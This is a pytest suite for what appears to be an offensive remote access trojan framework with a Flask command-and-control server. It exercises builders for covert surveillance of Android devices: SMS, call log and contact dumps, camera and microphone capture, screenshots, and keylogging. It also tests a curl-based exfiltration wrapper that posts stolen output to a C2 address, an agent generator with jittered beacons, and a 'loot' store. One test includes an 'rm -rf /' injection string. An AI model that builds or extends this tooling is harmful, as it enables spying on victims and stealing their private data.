"""Tests for quantum.rat (fleet-console remote access backend).

Pure builders/fleet logic plus a live Flask round-trip (heartbeat pulls the
dispatched task; data drop lands in loot). No live agents involved.
"""
import base64
import glob
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))), "src"))

import pytest  # noqa: E402

import quantum_cli as q  # noqa: E402
from quantum.postexploit.killswitch import TASKQ  # noqa: E402
from quantum.rat import agent as A  # noqa: E402
from quantum.rat import commands as R  # noqa: E402
from quantum.rat import fleet as F  # noqa: E402


def test_every_capability_has_honest_metadata():
    assert len(R.CAPABILITIES) >= 10
    for name, info in R.CAPABILITIES.items():
        assert info["title"].strip(), name
        assert info["requires"].strip(), name
        assert info["desc"].strip(), name
        assert callable(info["build"]), name
    assert set(R.capability_names()) == set(R.CAPABILITIES)


def test_describe_and_unknown_capability():
    d = R.describe("sms")
    assert d["requires"] == "termux-api"
    assert R.describe("nope") is None
    with pytest.raises(ValueError):
        R.build("nope")


def test_builders_emit_expected_mechanisms():
    assert "uname -a" in R.build("sysinfo")
    assert "ip-api.com" in R.build("locate")
    assert "ls -la" in R.build("ls", {"path": "/sdcard"})
    assert "/sdcard" in R.build("ls", {"path": "/sdcard"})
    assert "screencap -p" in R.build("shot")
    assert "termux-camera-photo" in R.build("snap", {"camera": 1})
    assert "-c 1" in R.build("snap", {"camera": 1})
    assert "termux-microphone-record" in R.build("mic", {"seconds": 30})
    assert "termux-sms-list" in R.build("sms")
    assert "termux-call-log" in R.build("calls")
    assert "termux-contact-list" in R.build("contacts")
    assert "pm list packages" in R.build("applist")
    assert "getevent" in R.build("keylog", {"seconds": 30})
    # shell injection guard: empty command refused, quoting applied
    with pytest.raises(ValueError):
        R.build("shell", {"cmd": "   "})
    assert R.build("shell", {"cmd": "id"}) == "id"
    dangerous = R.build("ls", {"path": "/sd card; rm -rf /"})
    assert "'/sd card; rm -rf /'" in dangerous  # quoted as one arg, not interpreted


def test_wrap_exfil_posts_to_data_channel():
    wrapped = R.wrap_exfil("id", "http://10.0.0.1:8443/", "rat-host")
    assert "id" in wrapped
    assert "http://10.0.0.1:8443/r" in wrapped
    assert "rat-host" in wrapped
    assert "base64" in wrapped and "curl" in wrapped
    assert "rm -f $T" in wrapped  # temp file always cleaned
    # rides the existing data-drop field (JSON-escaped inside the shell string)
    assert '\\"data\\"' in wrapped
    with pytest.raises(ValueError):
        R.wrap_exfil("  ", "http://x:8443", "h")


def test_dispatch_queues_taskq_entry():
    taskq = {}
    res = R.dispatch(taskq, "rat-host", "sysinfo",
                     c2_url="http://10.0.0.1:8443")
    assert res["host"] == "rat-host"
    assert res["capability"] == "sysinfo"
    assert res["requires"] == "stock"
    entry = taskq["rat-host"]
    assert entry["act"] == "run"
    assert "uname -a" in entry["cmd"]
    assert "http://10.0.0.1:8443/r" in entry["cmd"]
    with pytest.raises(ValueError):
        R.dispatch(taskq, "  ", "sysinfo")
    with pytest.raises(ValueError):
        R.dispatch(taskq, "h", "nope")


def test_fleet_snapshot_pending_stale_and_loot(tmp_path):
    loot = tmp_path / "loot"
    host_dir = loot / "rat-a"
    host_dir.mkdir(parents=True)
    (host_dir / "drop.txt").write_bytes(b"x" * 100)
    now = 1_700_000_000.0
    rows = F.snapshot(
        {"rat-a": {"last_seen": now - 10, "os": "android"},
         "rat-b": {"last_seen": now - 10_000, "os": None}},
        taskq_hosts=["rat-b", "rat-c"],
        loot_dir=str(loot),
        now=now,
    )
    by_host = {r["host"]: r for r in rows}
    assert set(by_host) == {"rat-a", "rat-b", "rat-c"}
    assert by_host["rat-a"]["pending"] is False
    assert by_host["rat-a"]["stale"] is False
    assert by_host["rat-a"]["loot_files"] == 1
    assert by_host["rat-a"]["loot_bytes"] == 100
    assert by_host["rat-b"]["pending"] is True
    assert by_host["rat-b"]["stale"] is True
    # never seen + never queued details -> stale, no loot
    assert by_host["rat-c"]["stale"] is True
    assert by_host["rat-c"]["loot_files"] == 0
    # missing loot dir is (0, 0), not an error
    rows2 = F.snapshot({"x": {"last_seen": now, "os": None}},
                       taskq_hosts=[], loot_dir=str(tmp_path / "nope"),
                       now=now)
    assert rows2[0]["loot_files"] == 0


def test_is_stale_boundaries():
    assert F.is_stale(100.0, now=100.0 + F.STALE_AFTER_S - 1) is False
    assert F.is_stale(100.0, now=100.0 + F.STALE_AFTER_S + 1) is True
    assert F.is_stale(None) is True
    assert F.is_stale("garbage") is True


def test_generate_rat_agent_variants(tmp_path):
    posix = A.generate_rat_agent(c2="10.0.0.1:8443", interval=60,
                                 out_dir=str(tmp_path))
    text = open(posix, encoding="utf-8").read()
    assert "act" in text and "hb" in text
    assert "http://10.0.0.1:8443/r" in text
    assert "sleep $(( I + RANDOM" in text
    droid = A.generate_rat_agent(c2="10.0.0.1:8443", interval=120,
                                 variant="android-termux",
                                 out_dir=str(tmp_path))
    dtext = open(droid, encoding="utf-8").read()
    assert "termux" in dtext and "http://10.0.0.1:8443/r" in dtext
    with pytest.raises(ValueError):
        A.generate_rat_agent(variant="windows", out_dir=str(tmp_path))
    with pytest.raises(ValueError):
        A.generate_rat_agent(interval=1, out_dir=str(tmp_path))


def _client():
    TASKQ.clear()
    app = q.make_c2({"default": "# test agent", "linux": "# test posix"})
    return app.test_client()


def test_roundtrip_dispatch_heartbeat_data(tmp_path, monkeypatch):
    import quantum.c2.routes as routes
    monkeypatch.setattr(routes, "LOOT_DIR", str(tmp_path))
    client = _client()
    try:
        R.dispatch(TASKQ, "rat-e2e", "sysinfo", c2_url="http://127.0.0.1:8443")
        hb = client.post("/r", json={"host": "rat-e2e", "act": "hb"})
        assert hb.status_code == 200
        body = hb.get_json()
        assert body["act"] == "run"
        assert "uname -a" in body["cmd"]
        # heartbeat consumed the task (second pull -> none)
        hb2 = client.post("/r", json={"host": "rat-e2e", "act": "hb"})
        assert hb2.get_json()["act"] == "none"
        # agent exfils output through the data channel -> loot file
        payload = base64.b64encode(b"uid=0(root)").decode()
        drop = client.post("/r", json={"host": "rat-e2e", "data": payload})
        assert drop.status_code == 200
        sealed = glob.glob(str(tmp_path / "rat-e2e" / "*.gfy"))
        assert len(sealed) == 1
    finally:
        TASKQ.clear()
